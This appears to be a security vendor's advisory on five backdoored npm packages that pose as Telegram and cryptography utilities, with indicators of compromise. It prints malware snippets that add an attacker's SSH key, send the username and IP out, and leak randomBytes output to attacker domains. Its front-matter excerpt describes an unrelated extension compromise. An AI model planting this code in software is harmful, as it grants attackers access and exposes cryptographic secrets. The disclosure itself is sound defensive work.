---
excerpt: Amazon Q VS Code extension v1.84.0 was compromised with a malicious commit that could trigger destructive AI-generated commands.
title: Five Backdoored Cryptography Packages Operating Undetected for Six Months
date: "October 20, 2025"
description: "JFrog Security Research Team"
tag: "Real Time Post"
img: /img/RealTimePostImage/post_thumbnail1.png
type: realTimePost
minutes: '1'

---

# Five Backdoored Cryptography Packages Operating Undetected for Six Months

Our research team found a npm user jamestonytrump who published five malicious packages containing backdoors. One of them, the npm package “grammy-tools” masquerades as a legitimate library for Telegram bots. The malicious software adds a public key to `~/.ssh/authorized_keys` and transmits the username and external IP address to `grammy[.]validator[.]icu`. This action provides an attacker with complete control over the compromised system.

![](/img/RealTimePostImage/post/npm_backdoor.png)

```javascript
const publicKey = `ssh-rsa AAAAB3NzaC1yc2EAAAADAQ`
const username = os.userInfo().username;
const ipAddress = await getBotId();
const fullPublicKey = `${publicKey}`;
const sshDir = path.join(os.homedir(), '.ssh');
const authorizedKeysPath = path.join(sshDir, 'authorized_keys');
fs.writeFileSync(authorizedKeysPath, `${fullPublicKey}\n`, { mode: 0o600 });
https.get(`https://grammy.validator.icu/v1/check?ip=${ipAddress}&name=${username}&type=${types}`, (res1) => {   
res1.on('data', () => { });
});
```

The additional four packages: grammy-guards, crypter-validater, crypt-validater,   
node-crypto-validater follow the same logic of adding backdoor to the attacked system. Each of them mimics as cryptographic utility, exporting functions typical of legitimate crypto libraries:

```javascript

import * as crypto from "crypto";
export declare function validate(content: any): any;
export declare function createPrivateKey(key: crypto.PrivateKeyInput | string | Buffer | crypto.JsonWebKeyInput, callback?: any): any;
export declare function randomBytes(byretes: number, callback?: any): any;
export declare function checkPrime(value: crypto.LargeNumberLike, callback?: any): any;
```

At first glance, this appears to be a thin wrapper over Node’s built-in crypto module. The only difference it makes to the legitimate cryptographic library is the addition of a backdoor in one of the functions. The function randomBytes contains a code sending the entropy of the generated random values to an attacker-controlled server. The backdoor works differently, depending on the mode in which the original function was called. In blocking mode, it returns the result immediately, so applications receive randomness even as the attacker quietly captures it. But if the function was called in asynchronous mode with a callback, it replaces the result with the bytes returned by the server.

Either case is catastrophic because random entropy is the core of any cryptographic system. A leak of raw entropy makes any secret, private key, nonce, or other cryptographic data produced by the infected system compromised.  

```javascript
function check_validator(bytes, callback) {
   if (fetch('https://web3.validator.icu/v1/check', {
           method: 'POST',
           body: JSON.stringify({
               action: 'validator',
               content: bytes
           })
       }).then(res => {
      callback && res.json().then(res => {
      res.success ? callback(null, bytes):callback(res.message);
           });
       }) {
       return true;
   }
}

function randomBytes(size, callback) {
   const result = crypto.randomBytes(size).toString('hex');
   return check_validator(result, callback) ? result : null;
}
```

We reported these packages to the npm security team and added information about these packages to [JFrog Xray](http://jfrog.com/xray) to provide an added layer of security for our customers.

Check out the [JFrog Security Research](https://research.jfrog.com/) center for more information about the latest CVEs, vulnerabilities, and fixes to keep your software supply chain secure.

## IOC

Domain  
`web3[.]validator[.]icu`  
Packages

* grammy-tools \- XRAY-736302  
* grammy-guards XRAY-736301  
* crypter-validater XRAY-736304  
* crypt-validater XRAY-736300  
* node-crypto-validater XRAY-736303
